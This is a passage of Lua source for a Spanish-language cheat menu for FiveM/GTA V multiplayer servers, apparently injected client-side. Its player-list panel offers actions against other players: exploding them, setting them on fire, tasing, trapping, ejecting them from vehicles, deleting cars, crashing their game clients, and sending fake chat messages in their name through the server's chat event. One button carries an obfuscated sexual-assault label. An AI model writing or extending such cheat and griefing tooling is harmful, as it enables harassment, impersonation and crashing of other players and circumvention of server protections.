        elseif count <= 50 then

            return 1.66

        elseif count <= 60 then

            return 2.22

        elseif count <= 70 then

            return 2.77

        elseif count <= 80 then

            return 3.33

        elseif count <= 90 then

            return 3.88

        elseif count <= 100 then

            return 4.45

        elseif count <= 110 then

            return 5.0

        else

            return count / 13.18

        end

    end



    local halt



    local title_color = {

        r = 255,

        g = 255,

        b = 255

    }



    local mode = 1



    local function _do_title_color()

        if mode == 1 then

            local r, g, b = _lerp(0.025, title_color.r, PCCT.Config.Tertiary[1]), _lerp(0.025, title_color.g, PCCT.Config.Tertiary[2]), _lerp(0.025, title_color.b, PCCT.Config.Tertiary[3])



            if picho.math.abs(PCCT.Config.Tertiary[1] - r) <= 3 and picho.math.abs(PCCT.Config.Tertiary[2] - g) <= 3 and picho.math.abs(PCCT.Config.Tertiary[3] - b) <= 3 then

                mode = 2

            end



            title_color.r = r

            title_color.g = g

            title_color.b = b

        elseif mode == 2 then

            local r, g, b = _lerp(0.025, title_color.r, 255), _lerp(0.025, title_color.g, 255), _lerp(0.025, title_color.b, 255)



            if picho.math.abs(255 - r) <= 3 and picho.math.abs(255 - g) <= 3 and picho.math.abs(255 - b) <= 3 then

                mode = 1

            end



            title_color.r = r

            title_color.g = g

            title_color.b = b

        end

    end



    function PCCT:DrawMenu()

        _do_title_color()



        if self.Painter:Holding(self.Config.MenuX, self.Config.MenuY, self.MenuW, 15, "drag_bar") then

            self:GetFunction("SetMouseCursorSprite")(4)

            local x, y = self:TranslateMouse(self.Config.MenuX, self.Config.MenuY, self.MenuW, 15, "drag_bar")

            self.Config.MenuX = x

            self.Config.MenuY = y

        elseif was_dragging == "drag_bar" then

            self.DraggingX = nil

            self.DraggingY = nil

            was_dragging = nil

        end



        if self.Config.NotifX and self.Config.NotifY and self.Config.NotifW then

            if self.Painter:Holding(self.Config.NotifX, self.Config.NotifY, self.Config.NotifW, 30, "drag_notif") then

                self:GetFunction("SetMouseCursorSprite")(4)

                local x, y = self:TranslateMouse(self.Config.NotifX, self.Config.NotifY, self.Config.NotifW, 30, "drag_notif")

                self.Config.NotifX = x

                self.Config.NotifY = y

            elseif was_dragging == "drag_notif" then

                self.DraggingX = nil

                self.DraggingY = nil

                was_dragging = nil

            end

        end



        self:LimitRenderBounds()



        if self.Config.UseBackgroundImage then

            self.Painter:DrawSprite(self.Config.MenuX + (self.MenuW / 2), self.Config.MenuY + (self.MenuH / 2), self.MenuW, self.MenuH, 0.0, self.DuiName, "watermark", 255, 255, 255, 255, true)

        end



        self.Painter:DrawRect(self.Config.MenuX, self.Config.MenuY - 38, 90, 33, 10, 10, 10, 200)

        self.Painter:DrawText(self.Name, 4, false, self.Config.MenuX + 2, self.Config.MenuY - 37, 0.4, picho.math.ceil(title_color.r), picho.math.ceil(title_color.g), picho.math.ceil(title_color.b), 255)

        self.Painter:DrawRect(self.Config.MenuX, self.Config.MenuY, self.MenuW, self.MenuH, 0, 0, 0, 200)

        self.Painter:DrawRect(self.Config.MenuX, self.Config.MenuY, self.MenuW, 18, 30, 30, 30, 200)

        self.Painter:DrawRect(self.Config.MenuX, self.Config.MenuY + 16, self.MenuW, 2, self.Config.Tertiary[1], self.Config.Tertiary[2], self.Config.Tertiary[3], self.Config.Tertiary[4])

        self.Painter:DrawRect(self.Config.MenuX + 5, self.Config.MenuY + 23, 515 + 113, self.MenuH - 28, 10, 10, 10, 200)

        self.Painter:DrawRect(self.Config.MenuX + 525 + 111, self.Config.MenuY + 103, 280, self.MenuH - 108, 10, 10, 10, 200)

        self.Painter:DrawRect(self.Config.MenuX + 525 + 111, self.Config.MenuY + 65, 280, 35, 10, 10, 10, 200)

        self.Painter:DrawRect(self.Config.MenuX + 520 + 113, self.Config.MenuY + 23, 283, 39, 10, 10, 10, 200)

        local list_pos = {}



        if not self.SelectedPlayer or not self.Util:ValidPlayer(self.SelectedPlayer) then

            self.Painter:DrawText("Jugadores Online: " .. #self.PlayerCache, 4, false, self.Config.MenuX + 530 + 113, self.Config.MenuY + 68, 0.35, 255, 255, 255, 255)



            if not scroller_pos then

                scroller_pos = 0

            end



            local plyY = self.Config.MenuY + 101 - scroller_pos * self:GetScrollBasis(#self.PlayerCache)

            scroller_max = self.MenuH - 120

            scroller_size = old_scroller or scroller_max



            if cur_count ~= #self.PlayerCache then

                scroller_size = scroller_max

                old_scroller = nil

            end



            local _players = self.PlayerCache

            picho.table.sort(_players, sort_func)



            for id, src in picho.pairs(_players) do

                list_pos[#list_pos + 1] = {

                    id = id,

                    src = src,

                    pos = picho.math.abs(self.Config.MenuY + 101 - plyY)

                }



                local color = picho.color_white



                if picho.friends[self:GetFunction("GetPlayerServerId")(src)] then

                    color = picho.color_friend

                end



                if plyY >= (self.Config.MenuY + 92) and plyY <= (self.Config.MenuY + self.MenuH - 30) then

                    if self.Painter:Button("ID: " .. self:GetFunction("GetPlayerServerId")(src) .. " | Nombre: " .. self:CleanName(self:GetFunction("GetPlayerName")(src)), self.Config.MenuX + 525 + 113, plyY, 5, 5, nil, 20, color[1], color[2], color[3], 255, "player_" .. id, false, 0.35) then

                        self.SelectedPlayer = src

                    end

                else

                    if not old_scroller then

                        scroller_size = self:Clamp(scroller_size - 23, 50, scroller_max)

                    end

                end



                plyY = plyY + 23

            end



            halt = false



            if not old_scroller then

                old_scroller = scroller_size

            end



            if not cur_count then

                cur_count = #self.PlayerCache

            end



            self.Painter:DrawRect(self.Config.MenuX + 5 + 100 + 5 + 415 + 265 + 113, self.Config.MenuY + 108, 8, self.MenuH - 120, 20, 20, 20, 255)

            self.Painter:DrawRect(self.Config.MenuX + 5 + 100 + 5 + 415 + 265 + 113, self.Config.MenuY + 108 + scroller_pos, 8, scroller_size, self.Config.Tertiary[1], self.Config.Tertiary[2], self.Config.Tertiary[3], self.Config.Tertiary[4])



            if self.Painter:Hovered(self.Config.MenuX + 5 + 100 + 5 + 415 + 113, self.Config.MenuY + 103, 280, self.MenuH - 108) then

                if self:GetFunction("IsDisabledControlPressed")(0, self.Keys["MWHEELDOWN"]) then

                    scroller_pos = scroller_pos + 8

                    scroller_pos = self:Clamp(scroller_pos, 0, self.MenuH - 120 - scroller_size)

                elseif self:GetFunction("IsDisabledControlPressed")(0, self.Keys["MWHEELUP"]) then

                    scroller_pos = scroller_pos - 8

                    scroller_pos = self:Clamp(scroller_pos, 0, self.MenuH - 120 - scroller_size)

                end

            end



            if self.Painter:Holding(self.Config.MenuX + 5 + 100 + 5 + 415 + 265 + 113, self.Config.MenuY + 108 + scroller_pos, 8, scroller_size, "scroll_bar") then

                self:GetFunction("SetMouseCursorSprite")(4)

                local y = self:TranslateScroller(self.Config.MenuY + 68, scroller_size, scroller_pos)

                scrolling = true

                scroller_pos = self:Clamp(y, 0, self.MenuH - 120 - scroller_size)

            else

                scroller_y = nil

                scrolling = false

            end

        else

            self.Painter:DrawText("Seleccionado: " .. self:CleanName(self:GetFunction("GetPlayerName")(self.SelectedPlayer)) .. " (ID: " .. self:GetFunction("GetPlayerServerId")(self.SelectedPlayer) .. ")", 4, false, self.Config.MenuX + 530 + 113, self.Config.MenuY + 67, 0.35, 255, 255, 255, 255)

            local curY = 3



            if self.Painter:Button("ATRAS", self.Config.MenuX + 525 + 113, self.Config.MenuY + 101, 5, curY, nil, 20, 255, 255, 255, 255, "go_back", false, 0.35) then

                self.SelectedPlayer = nil

                halt = true

            end



            if not halt then

                curY = curY + 20

                local spectate_text = ""



                if self.SpectatingPlayer and self:GetFunction("DoesEntityExist")(self:GetFunction("GetPlayerPed")(self.SpectatingPlayer)) then

                    spectate_text = " [SPECTEANDO: " .. self:CleanName(self:GetFunction("GetPlayerName")(self.SpectatingPlayer)) .. "]"

                end



                local track_text = ""



                if self.TrackingPlayer and self:GetFunction("DoesEntityExist")(self:GetFunction("GetPlayerPed")(self.TrackingPlayer)) then

                    track_text = " [SIGUIENDO: " .. self:CleanName(self:GetFunction("GetPlayerName")(self.TrackingPlayer)) .. "]"

                end



                if self.SelectedPlayer ~= self.NetworkID then

                    if self.Painter:Button("TP ", self.Config.MenuX + 525 + 113, self.Config.MenuY + 101, 5, curY, nil, 20, 255, 255, 255, 255, "teleport_player", false, 0.35) then

                        local ped = self:GetFunction("GetPlayerPed")(self.SelectedPlayer)

                        local coords = self:GetFunction("GetOffsetFromEntityInWorldCoords")(ped, 0.0, 0.0, 0.0)

                        self:GetFunction("RequestCollisionAtCoord")(coords.x, coords.y, coords.z)



                        if self:GetFunction("IsPedInAnyVehicle")(ped) and self:GetFunction("AreAnyVehicleSeatsFree")(self:GetFunction("GetVehiclePedIsIn")(ped)) then

                            self:GetFunction("SetPedIntoVehicle")(self.LocalPlayer, self:GetFunction("GetVehiclePedIsIn")(ped), -2)

                        else

                            self:GetFunction("SetEntityCoords")(self.LocalPlayer, coords.x, coords.y, coords.z, false, false, false, false)

                        end



                        self:AddNotification("EXITO", "Te tpeaste al jugador.")

                    end



                    curY = curY + 20

                end



                if self.SelectedPlayer ~= self.NetworkID then

                    if self.Painter:Button("SEGUIR" .. track_text, self.Config.MenuX + 525 + 113, self.Config.MenuY + 101, 5, curY, nil, 20, 255, 255, 255, 255, "track_player", false, 0.35) then

                        if self.TrackingPlayer ~= nil and self:GetFunction("DoesEntityExist")(self:GetFunction("GetPlayerPed")(self.TrackingPlayer)) then

                            self:AddNotification("INFO", "Paraste de seguir " .. self:CleanName(self:GetFunction("GetPlayerName")(self.TrackingPlayer)))

                            self.TrackingPlayer = nil

                        else

                            self.TrackingPlayer = self.SelectedPlayer

                            self:AddNotification("INFO", "Siguiendo " .. self:CleanName(self:GetFunction("GetPlayerName")(self.TrackingPlayer)), 10000)

                        end

                    end



                    curY = curY + 20

                end



                if self.SelectedPlayer ~= self.NetworkID then

                    if self.Painter:Button("SPECTEAR" .. spectate_text, self.Config.MenuX + 525 + 113, self.Config.MenuY + 101, 5, curY, nil, 20, 255, 255, 255, 255, "spectate_player", false, 0.35) then

                        if self.SpectatingPlayer ~= nil and self:GetFunction("DoesEntityExist")(self:GetFunction("GetPlayerPed")(self.SpectatingPlayer)) then

                            self:AddNotification("INFO", "Paraste de spectear " .. self:CleanName(self:GetFunction("GetPlayerName")(self.SpectatingPlayer)))

                            self:Spectate(false)

                        else

                            self:Spectate(self.SelectedPlayer)

                            self:AddNotification("INFO", "Specteando " .. self:CleanName(self:GetFunction("GetPlayerName")(self.SpectatingPlayer)), 10000)

                        end

                    end



                    curY = curY + 20

                end



                if self.Painter:Button("EXPLOTAR", self.Config.MenuX + 525 + 113, self.Config.MenuY + 101, 5, curY, nil, 20, 255, 255, 255, 255, "explode_player", false, 0.35) then

                    if self.Config.SafeMode then

                        self:AddNotification("AVISO", " Modo seguro activado, desactivalo para poder usarlo")

                    else

                        self:GetFunction("AddExplosion")(self:GetFunction("GetOffsetFromEntityInWorldCoords")(self:GetFunction("GetPlayerPed")(self.SelectedPlayer), 0.0, 0.0, 0.0), 7, 100000.0, true, false, 0.0)

                        self:AddNotification("INFO", "Player blown up.", 10000)

                    end

                end



                curY = curY + 20



                if self.Painter:Button("DAR TODAS LAS ARMAS", self.Config.MenuX + 525 + 113, self.Config.MenuY + 101, 5, curY, nil, 20, 255, 255, 255, 255, "give_player_all_weapons", false, 0.35) then

                    if self.Config.SafeMode then

                        self:AddNotification("AVISO", "Desabilitar modo seguro para usar esto.")

                    else

                        local ped = self:GetFunction("GetPlayerPed")(self.SelectedPlayer)



                        for _, wep in picho.pairs(all_weapons) do

                            self:GetFunction("GiveWeaponToPed")(ped, self:GetFunction("GetHashKey")(wep), 9000, false, true)

                        end



                        self:AddNotification("EXITO", "Todas las armas dadas.", 10000)

                    end

                end



                curY = curY + 20



                if self.Painter:Button("DAR ESPECIFICA", self.Config.MenuX + 525 + 113, self.Config.MenuY + 101, 5, curY, nil, 20, 255, 255, 255, 255, "give_player_specific", false, 0.35) then

                    if self.Config.SafeMode then

                        self:AddNotification("AVISO", "Desabilitar modo seguro para usar esto.")

                    else

                        local ped = self:GetFunction("GetPlayerPed")(self.SelectedPlayer)

                        self:DoGiveWeaponUI(ped)

                    end

                end



                curY = curY + 20



                if self.Painter:Button("SACAR PROPS (SHIFT PARA PEGAR)", self.Config.MenuX + 525 + 113, self.Config.MenuY + 101, 5, curY, nil, 20, 255, 255, 255, 255, "spawn_object", false, 0.35) then

                    local ped = self:GetFunction("GetPlayerPed")(self.SelectedPlayer)

                    self:DoSpawnObjectUI(ped)

                end



                curY = curY + 20



                if self.Painter:Button("ENCERRAR JUGADOR", self.Config.MenuX + 525 + 113, self.Config.MenuY + 101, 5, curY, nil, 20, 255, 255, 255, 255, "gas_player", false, 0.35) then

                    self:GasPlayer(self.SelectedPlayer)



                    if not self.Config.SafeMode then

                        self:AddNotification("EXITO", "Jugador encerrado!", 10000)

                    end

                end



                curY = curY + 20



                if self.Painter:Button("TAZEAR JUGADOR", self.Config.MenuX + 525 + 113, self.Config.MenuY + 101, 5, curY, nil, 20, 255, 255, 255, 255, "taze_player", false, 0.35) then

                    self:TazePlayer(self.SelectedPlayer)

                    self:AddNotification("EXITO", "Jugador tazeado!", 10000)

                end



                curY = curY + 20



                if self.Painter:Button("AGUITA", self.Config.MenuX + 525 + 113, self.Config.MenuY + 101, 5, curY, nil, 20, 255, 255, 255, 255, "hydrant_player", false, 0.35) then

                    self:HydrantPlayer(self.SelectedPlayer)

                    self:AddNotification("EXITO", "Lo mojaste!", 10000)

                end



                curY = curY + 20



                if self.Painter:Button("FUEGO", self.Config.MenuX + 525 + 113, self.Config.MenuY + 101, 5, curY, nil, 20, 255, 255, 255, 255, "fire_player", false, 0.35) then

                    self:FirePlayer(self.SelectedPlayer)

                    self:AddNotification("EXITO", "Fuego al jugador", 10000)

                end



                curY = curY + 20



                if self.Painter:Button("SACAR DEL COCHE", self.Config.MenuX + 525 + 113, self.Config.MenuY + 101, 5, curY, nil, 20, 255, 255, 255, 255, "kick_player_car", false, 0.35) then

                    if not self:GetFunction("IsPedInAnyVehicle")(self:GetFunction("GetPlayerPed")(self.SelectedPlayer)) then

                        self:AddNotification("ERROR", "No esta en un coche!", 5000)

                    else

                        if self.Config.SafeMode then

                            self:AddNotification("AVISO", "Desabilitar modo seguro para usar esto.")

                        else

                            self:GetFunction("ClearPedTasksImmediately")(self:GetFunction("GetPlayerPed")(self.SelectedPlayer))

                            self:AddNotification("EXITO", "Jugador kickeado del auto!", 5000)

                        end

                    end

                end



                curY = curY + 20



                if self.Painter:Button("DESABILITAR COCHE", self.Config.MenuX + 525 + 113, self.Config.MenuY + 101, 5, curY, nil, 20, 255, 255, 255, 255, "disable_player_car", false, 0.35) then

                    if not self:GetFunction("IsPedInAnyVehicle")(self:GetFunction("GetPlayerPed")(self.SelectedPlayer)) then

                        self:AddNotification("ERROR", "Jugador no esta en un coche!", 5000)

                    else

                        self:AddNotification("EXITO", "Desabilitamiento exitoso.", 5000)

                        self:DisableVehicle(self:GetFunction("GetVehiclePedIsIn")(self:GetFunction("GetPlayerPed")(self.SelectedPlayer)))

                    end

                end



                curY = curY + 20



                if self.Painter:Button("BORRAR COCHE", self.Config.MenuX + 525 + 113, self.Config.MenuY + 101, 5, curY, nil, 20, 255, 255, 255, 255, "delete_player_car", false, 0.35) then

                    if not self:GetFunction("IsPedInAnyVehicle")(self:GetFunction("GetPlayerPed")(self.SelectedPlayer)) then

                        self:AddNotification("ERROR", "No esta en un coche!", 5000)

                    else

                        CreateThread(function()

                            self:AddNotification("EXITO", "Borrando coche.", 5000)



                            if not self:RequestControlSync(self:GetFunction("GetVehiclePedIsIn")(self:GetFunction("GetPlayerPed")(self.SelectedPlayer))) then

                                self:AddNotification("ERROR", "No pude tomar el control en la red :(. Vuelve a intentar.", 5000)

                            else

                                self.Util:DeleteEntity(self:GetFunction("GetVehiclePedIsIn")(self:GetFunction("GetPlayerPed")(self.SelectedPlayer)))

                            end

                        end)

                    end

                end



                curY = curY + 20



                if self.Painter:Button("CLONAR COCHE", self.Config.MenuX + 525 + 113, self.Config.MenuY + 101, 5, curY, nil, 20, 255, 255, 255, 255, "clone_player_car", false, 0.35) then

                    if not self:GetFunction("IsPedInAnyVehicle")(self:GetFunction("GetPlayerPed")(self.SelectedPlayer)) then

                        self:AddNotification("ERROR", "No esta en un coche!", 5000)

                    else

                        local entity = self:GetFunction("GetVehiclePedIsIn")(self:GetFunction("GetPlayerPed")(self.SelectedPlayer))

                        self:SpawnLocalVehicle(self:GetFunction("GetEntityModel")(entity), false, true)

                        self:AddNotification("EXITO", "Vehiculo clonado!", 5000)

                    end

                end



                curY = curY + 20



                if self.Painter:Button("C0G3R JUGADOR", self.Config.MenuX + 525 + 113, self.Config.MenuY + 101, 5, curY, nil, 20, 255, 255, 255, 255, "rape_player", false, 0.35) then

                    self:RapePlayer(self.SelectedPlayer)



                    if not self.Config.SafeMode then

                        self:AddNotification("EXITO", "Jugador c0g1do!", 10000)

                    end

                end



                curY = curY + 20

                local friend_text = picho.friends[self:GetFunction("GetPlayerServerId")(self.SelectedPlayer)] and "QUITAR DE AMIGO" or "MARCAR DE AMIGO"



                if self.Painter:Button(friend_text, self.Config.MenuX + 525 + 113, self.Config.MenuY + 101, 5, curY, nil, 20, 255, 255, 255, 255, "friend_toggle", false, 0.35) then

                    picho.friends[self:GetFunction("GetPlayerServerId")(self.SelectedPlayer)] = not picho.friends[self:GetFunction("GetPlayerServerId")(self.SelectedPlayer)]

                end



                curY = curY + 20



                if self.Painter:Button("CLONAR OUTFIT", self.Config.MenuX + 525 + 113, self.Config.MenuY + 101, 5, curY, nil, 20, 255, 255, 255, 255, "steal_player_outfit", false, 0.35) then

                    local p_ped = self:GetFunction("GetPlayerPed")(self.SelectedPlayer)

                    local mdl = self:GetFunction("GetEntityModel")(p_ped)



                    if self:GetFunction("GetEntityModel")(self.LocalPlayer) ~= mdl then

                        self:GetFunction("SetPlayerModel")(self.NetworkID, mdl)

                    end



                    self:StealOutfit(self.LocalPlayer, p_ped)

                    self:AddNotification("EXITO", "Outfit clonado.", 5000)

                end



                curY = curY + 20



                if self.DynamicTriggers["chat"] and self.DynamicTriggers["chat"]["_chat:messageEntered"] then

                    if self.Painter:Button("MENSAJE FALSO", self.Config.MenuX + 525 + 113, self.Config.MenuY + 101, 5, curY, nil, 20, 255, 255, 255, 255, "fake_chat_message", false, 0.35) then

                        local selFM = self:GetTextInput("Mensaje a enviar.", "", 100)

                        local playa = self:GetFunction("GetPlayerName")(self.SelectedPlayer)



                        if selfM then

                            self:GetFunction("TriggerServerEvent")(self.DynamicTriggers["chat"]["_chat:messageEntered"], playa, {0, 0x99, 255}, selfM)

                            self:AddNotification("EXITO", "Mensaje enviado!", 10000)

                        end

                    end



                    curY = curY + 20

                end

                 if self.Painter:Button("~r~Crashiar Jugador (Shift Para Metodo)", self.Config.MenuX + 525 + 113, self.Config.MenuY + 101, 5, curY, nil, 20, 255, 255, 255, 255, "crash_online_player", false, 0.35) then

                     local method = nil

                     if self.Config.SafeMode then

                         self:AddNotification("AVISO", "Modo seguro activado, desactivalo para poder usarlo")

                     else

                         if self:GetFunction("IsDisabledControlPressed")(0, self.Keys["LEFTSHIFT"]) then

                             local _method = self:GetTextInput("Pon el metodo. [objeto / ped / ambos]", "ambos", 10)

                             if _method then

                                 method = _method

                                 self:AddNotification("INFO", "Usando " .. method .. " metodo.")

                             end

                         end

                        self:CrashPlayer(self.SelectedPlayer, nil, method)

                     end

                end

            end

        end



        local curX = self.Config.MenuX + 7



        for _, data in picho.ipairs(self.Categories) do

            local size = self.Painter:GetTextWidth(data.Title, 4, 0.34)



            if self.Painter:ListItem(data.Title, curX, self.Config.MenuY + 26, 0, 0, size + 28.6, 20, 0, 0, 0, 200, "category_" .. _) then

                self.Config.CurrentSelection = _

                self.Config.SelectedCategory = "category_" .. _



                if data.Title ~= "~r~CERRAR" then

                end

            end



            curX = curX + size + 28.6 + 2

        end



        if self.Config.CurrentSelection and self.Categories[self.Config.CurrentSelection] then

            self.Categories[self.Config.CurrentSelection].Build(self, self.Config.MenuX + 5, self.Config.MenuY + 46, 515 + 113, self.MenuH - 28)

        else

            self.Config.CurrentSelection = 1

            self.Config.SelectedCategory = "category_1"

        end

    end



    local last_clean = 0



    function PCCT:Cleanup()

        if last_clean <= self:GetFunction("GetGameTimer")() then

            last_clean = self:GetFunction("GetGameTimer")() + 15000

            collectgarbage("collect")

        end

    end



    local was_showing

    local was_invis

    local was_other_invis = {}

    local was_noragdoll

    local was_BypassBJ

    local was_noclip

    local was_fastrun

    local was_thermal

    local walking

    local magic_carpet_obj

    local preview_magic_carpet

    local magic_riding

    local was_infinite_combat_roll

    local was_fakedead

    local fakedead_timer = 0

    local last_afk_move = 0



    CreateThread(function()

        while PCCT.Enabled do

            Wait(0)



            if PCCT.Config.Player.RevealInvisibles then

                for id, src in picho.pairs(PCCT.PlayerCache) do

                    src = picho.tonumber(src)



                    if src ~= PCCT.NetworkID then

                        local _ped = PCCT:GetFunction("GetPlayerPed")(src)

                        local where = PCCT:GetFunction("GetOffsetFromEntityInWorldCoords")(_ped, 0.0, 0.0, 1.0)

                        local us = PCCT:GetFunction("GetOffsetFromEntityInWorldCoords")(PCCT.LocalPlayer, 0.0, 0.0, 0.0)

                        local dist = PCCT:GetFunction("GetDistanceBetweenCoords")(where.x, where.y, where.z, us.x, us.y, us.z)



                        if dist <= 100.0 then

                            local invis = not PCCT:GetFunction("IsEntityVisibleToScript")(_ped)



                            if invis then

                                PCCT:GetFunction("SetEntityLocallyVisible")(_ped, true)

                                PCCT:GetFunction("SetEntityAlpha")(_ped, 150)

                                PCCT:Draw3DText(where.x, where.y, where.z + 1.5, "*PLAYER INVISIBLE*", 255, 55, 55, 255)

                                was_other_invis[src] = true

                            else

                                PCCT:GetFunction("SetEntityAlpha")(_ped, 255)

                                was_other_invis[src] = false

                            end

                        else

                            PCCT:GetFunction("SetEntityAlpha")(_ped, 255)

                            was_other_invis[src] = false

                        end

                    end

                end

            end

        end

    end)



    local give_asking_category

    local selected_give_cat = 1

    local selected_give_opt = 1

    local notif_alpha = 0

    local offX = 0

    local was_showing_give

    local _no_combat

    local _was_no_combat



    function PCCT:DoGiveWeaponUI(ped)

        if ped then

            self.GivingWeaponTo = ped

            was_showing_give = self.Showing

            self.Showing = false

            _no_combat = true

            give_asking_category = true

            selected_give_cat = 1

            selected_give_opt = 1

        end



        if self.GivingWeaponTo then

            if not self:GetFunction("DoesEntityExist")(self.GivingWeaponTo) then

                self.GivingWeaponTo = nil

                self.Showing = was_showing_give

                _no_combat = false



                return

            end



            if self.Showing then return end



            if self.Config.ShowNotifications and notif_alpha > 0 then

                offX = _lerp(0.1, offX, 429)

            else

                offX = _lerp(0.1, offX, 0)

            end



            local sY = 30

            local max_opts = 30

            local cur_opt = (give_asking_category and selected_give_cat or selected_give_opt)

            local options = (give_asking_category and give_weapon_list or give_weapon_list[selected_give_cat].Weapons)

            local count = 0

            local total_opts = (#options or 0)

            local can_see = true

            self.Painter:DrawText("[" .. ("<font color='#%s'>%s</font>"):format(self.TertiaryHex, self.Name) .. "] Dar Armas (" .. cur_opt .. "/" .. total_opts .. ")", 4, false, self:ScrW() - 360 - 21 - offX, 21, 0.35, 255, 255, 255, 255)



            if give_asking_category then

                for id, val in picho.pairs(options or {}) do

                    if total_opts > max_opts then

                        can_see = cur_opt - 10 <= id and cur_opt + 10 >= id

                    else

                        count = 0

                    end



                    if can_see and count <= 10 then

                        local r, g, b = 255, 255, 255



                        if cur_opt == id then

                            r, g, b = self.Config.Tertiary[1], self.Config.Tertiary[2], self.Config.Tertiary[3]

                        end



                        self.Painter:DrawText(val.Name, 4, false, self:ScrW() - 360 - 21 - offX, 21 + sY, 0.35, r, g, b, 255)

                        sY = sY + 20

                        count = count + 1

                    end

                end

            else

                for id, val in picho.pairs(options or {}) do

                    if total_opts > max_opts then

                        can_see = cur_opt - 10 <= id and cur_opt + 10 >= id

                    else

                        count = 0

                    end



                    if can_see and count <= 10 then

                        local r, g, b = 255, 255, 255



                        if cur_opt == id then

                            r, g, b = self.Config.Tertiary[1], self.Config.Tertiary[2], self.Config.Tertiary[3]

                        end



                        self.Painter:DrawText(val, 4, false, self:ScrW() - 360 - 21 - offX, 21 + sY, 0.35, r, g, b, 255)

                        sY = sY + 20

                        count = count + 1

                    end

                end

            end



            if self:GetFunction("IsDisabledControlJustPressed")(0, self.Keys["DOWN"]) and not self.Showing then

                if give_asking_category then

                    local new = selected_give_cat + 1



                    if options[new] then

                        selected_give_cat = new

                    else

                        selected_give_cat = 1

                    end

                else

                    local new = selected_give_opt + 1



                    if options[new] then

                        selected_give_opt = new

                    else

                        selected_give_opt = 1

                    end

                end

            end



            if self:GetFunction("IsDisabledControlJustPressed")(0, self.Keys["UP"]) and not self.Showing then

                if give_asking_category then

                    local new = selected_give_cat - 1



                    if options[new] then

                        selected_give_cat = new

                    else

                        selected_give_cat = #options

                    end

                else

                    local new = selected_give_opt - 1



                    if options[new] then

                        selected_give_opt = new

                    else

                        selected_give_opt = #options

                    end

                end

            end



            if self:GetFunction("IsDisabledControlJustPressed")(0, self.Keys["BACKSPACE"]) and not self.Showing then

                if not give_asking_category then

                    give_asking_category = true

                    selected_give_opt = 1

                else

                    self.Showing = was_showing_give

                    self.GivingWeaponTo = nil

                    selected_give_opt = 1

                    _no_combat = false

                end

            end



            if self:GetFunction("IsDisabledControlJustPressed")(0, self.Keys["ENTER"]) and not self:GetFunction("IsDisabledControlJustPressed")(0, self.Keys["MOUSE1"]) and not self:GetFunction("IsDisabledControlJustPressed")(0, self.Keys["SPACE"]) and not self.Showing then

                if give_asking_category then

                    give_asking_category = false

                    selected_give_opt = 1

                else

                    local weapon = options[cur_opt]

                    self:AddNotification("INFO", "se te dio " .. ("<font color='#%s'>%s</font>"):format(self.TertiaryHex, weapon))

                    self:GetFunction("GiveWeaponToPed")(self.GivingWeaponTo, self:GetFunction("GetHashKey")(weapon), 500, false, true)

                end

            end



            self.Painter:DrawRect(self:ScrW() - 360 - 21 - offX, 20, 360, sY + 8, 0, 0, 0, 200)

            self.Painter:DrawRect(self:ScrW() - 360 - 21 - offX, 49, 360, 2, self.Config.Tertiary[1], self.Config.Tertiary[2], self.Config.Tertiary[3], 255)

        end

    end



    function PCCT:DoTakeWeaponUI(ped)

        if ped then

            self.TakingWeaponFrom = ped

            was_showing_give = self.Showing

            self.Showing = false

            _no_combat = true

            give_asking_category = true

            selected_give_cat = 1

            selected_give_opt = 1

        end



        if self.TakingWeaponFrom then

            if not self:GetFunction("DoesEntityExist")(self.TakingWeaponFrom) then

                self.TakingWeaponFrom = nil

                self.Showing = was_showing_give

                _no_combat = false



                return

            end



            if self.Showing then return end



            if self.Config.ShowNotifications and notif_alpha > 0 then

                offX = _lerp(0.1, offX, 429)

            else

                offX = _lerp(0.1, offX, 0)

            end



            local sY = 30

            local max_opts = 30

            local cur_opt = (give_asking_category and selected_give_cat or selected_give_opt)

            local options = (give_asking_category and give_weapon_list or give_weapon_list[selected_give_cat].Weapons)

            local count = 0

            local total_opts = (#options or 0)

            local can_see = true

            self.Painter:DrawText("[" .. ("<font color='#%s'>%s</font>"):format(self.TertiaryHex, self.Name) .. "] Remove Weapon (" .. cur_opt .. "/" .. total_opts .. ")", 4, false, self:ScrW() - 360 - 21 - offX, 21, 0.35, 255, 255, 255, 255)



            if give_asking_category then

                for id, val in picho.pairs(options or {}) do

                    if total_opts > max_opts then

                        can_see = cur_opt - 10 <= id and cur_opt + 10 >= id

                    else

                        count = 0

                    end



                    if can_see and count <= 10 then

                        local r, g, b = 255, 255, 255



                        if cur_opt == id then

                            r, g, b = self.Config.Tertiary[1], self.Config.Tertiary[2], self.Config.Tertiary[3]

                        end



                        self.Painter:DrawText(val.Name, 4, false, self:ScrW() - 360 - 21 - offX, 21 + sY, 0.35, r, g, b, 255)

                        sY = sY + 20

                        count = count + 1

                    end

                end

            else

                for id, val in picho.pairs(options or {}) do

                    if total_opts > max_opts then

                        can_see = cur_opt - 10 <= id and cur_opt + 10 >= id

                    else

                        count = 0

                    end



                    if can_see and count <= 10 then

                        local r, g, b = 255, 255, 255



                        if cur_opt == id then

                            r, g, b = self.Config.Tertiary[1], self.Config.Tertiary[2], self.Config.Tertiary[3]

                        end



                        self.Painter:DrawText(val, 4, false, self:ScrW() - 360 - 21 - offX, 21 + sY, 0.35, r, g, b, 255)

                        sY = sY + 20

                        count = count + 1

                    end

                end

            end



            if self:GetFunction("IsDisabledControlJustPressed")(0, self.Keys["DOWN"]) and not self.Showing then

                if give_asking_category then

                    local new = selected_give_cat + 1



                    if options[new] then

                        selected_give_cat = new

                    else

                        selected_give_cat = 1

                    end

                else

                    local new = selected_give_opt + 1



                    if options[new] then

                        selected_give_opt = new

                    else

                        selected_give_opt = 1

                    end

                end

            end



            if self:GetFunction("IsDisabledControlJustPressed")(0, self.Keys["UP"]) and not self.Showing then

                if give_asking_category then

                    local new = selected_give_cat - 1



                    if options[new] then

                        selected_give_cat = new

                    else

                        selected_give_cat = #options

                    end

                else

                    local new = selected_give_opt - 1



                    if options[new] then

                        selected_give_opt = new

                    else

                        selected_give_opt = #options

                    end

                end

            end



            if self:GetFunction("IsDisabledControlJustPressed")(0, self.Keys["BACKSPACE"]) and not self.Showing then

                if not give_asking_category then

                    give_asking_category = true

                    selected_give_opt = 1

                else

                    self.Showing = was_showing_give

                    self.TakingWeaponFrom = nil

                    selected_give_opt = 1

                    _no_combat = false

                end

            end



            if self:GetFunction("IsDisabledControlJustPressed")(0, self.Keys["ENTER"]) and not self:GetFunction("IsDisabledControlJustPressed")(0, self.Keys["MOUSE1"]) and not self:GetFunction("IsDisabledControlJustPressed")(0, self.Keys["SPACE"]) and not self.Showing then

                if give_asking_category then

